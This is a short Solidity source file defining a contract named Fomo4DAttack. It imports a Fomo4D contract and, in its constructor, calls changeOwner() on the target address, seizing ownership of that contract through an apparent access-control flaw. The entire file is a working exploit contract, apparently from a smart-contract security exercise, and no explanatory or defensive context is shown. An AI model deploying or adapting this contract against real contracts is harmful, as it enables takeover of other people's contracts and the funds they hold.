pragma solidity ^0.4.24;

import './Fomo4D.sol';

contract Fomo4DAttack {
    function Fomo4DAttack(address _fomo4dAddress) {
        Fomo4D(_fomo4dAddress).changeOwner();
    }
}
